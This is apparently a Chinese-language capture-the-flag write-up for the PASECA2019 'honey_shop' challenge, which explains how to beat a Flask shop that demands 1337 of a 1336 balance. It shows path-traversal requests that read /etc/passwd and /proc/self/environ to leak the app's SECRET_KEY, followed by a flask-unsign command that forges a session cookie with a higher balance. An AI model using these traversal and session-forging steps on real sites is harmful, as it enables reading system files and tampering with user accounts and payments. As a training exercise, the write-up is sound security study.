# \[PASECA2019]honey\_shop

## \[PASECA2019]honey\_shop

## 考点

* LFI
* 任意文件下载
* Flask伪造session

## wp

提示有1336块钱，买flag需要1337块钱。

发现存在session内容如下

```
eyJiYWxhbmNlIjoxMzM2LCJwdXJjaGFzZXMiOltdfQ.YmkaXQ.fruZujDjSk6Qq1MSDRQGKuX8NVw
```

flask-unsign解码一下，得到`{'balance': 1336, 'purchases': []}`，看来需要获取secret\_key修改session来购买flag

试了一下，整个页面除了购买外，只有图片可以点

![](<../../.gitbook/assets/image (23).png>)

尝试任意文件下载，发现/download?image=../../etc/passwd可以下载文件

![](<../../.gitbook/assets/image (35).png>)

访问/download?image=../../proc/self/cmdline，得到运行目录app/app.py

访问/download?image=../../proc/self/environ得到SECRET\_KEY=eiYzH7ck0Pta8ghUGYRRpD8LtNjw5TE2ssJ1BL0F

![](<../../.gitbook/assets/image (4).png>)

重新加密session，`flask-unsign.exe --secret "eiYzH7ck0Pta8ghUGYRRpD8LtNjw5TE2ssJ1BL0F" --sign --cookie "{'balance': 2000, 'purchases': []}"`，得到`eyJiYWxhbmNlIjoyMDAwLCJwdXJjaGFzZXMiOltdfQ.YmkdOg.P80Or5syU9nQrh8nURtyyqinVUY`

修改session购买flag即可
